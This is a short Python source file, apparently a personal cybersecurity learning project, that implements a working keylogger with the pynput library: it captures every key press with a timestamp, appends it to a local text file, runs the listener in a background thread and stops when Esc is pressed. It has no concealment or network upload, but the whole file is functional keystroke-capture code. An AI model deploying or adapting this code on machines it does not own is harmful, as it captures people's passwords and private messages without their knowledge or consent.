from pynput import keyboard
import time
import os
import threading

#File path
KEYLOGGER_FILE = "/home/sodead/Documents/Code/Cybersec/Keylogger/recorded_keystrokes.txt"
STOP_FLAG = False

#Check
log_dir = os.path.dirname(KEYLOGGER_FILE)
if log_dir:
    os.makedirs(log_dir, exist_ok=True)

#File Creation
if not os.path.exists(KEYLOGGER_FILE):
    with open(KEYLOGGER_FILE, 'w') as f:
        f.write("Keylogger started at " + time.strftime('%d/%m/%Y %H:%M:%S') + "\n")

def on_press(key):
    timestamp = time.strftime('%d/%m/%Y %H:%M:%S')

    with open(KEYLOGGER_FILE, 'a') as f:
        try:
            f.write(f'\n[{timestamp}]: {key.char}')
        except AttributeError:
            f.write(f'\n[{timestamp}]: <{str(key).replace("Key.", "")}>')

def on_release(key):
    global STOP_FLAG
    if key == keyboard.Key.esc:
        print("\nKeylogger shutting down...")
        STOP_FLAG = True  # Set stop flag
        return False  # Stop the listener

def run_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

#Background
keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
keylogger_thread.start()

#Alive
while not STOP_FLAG:
    time.sleep(1)
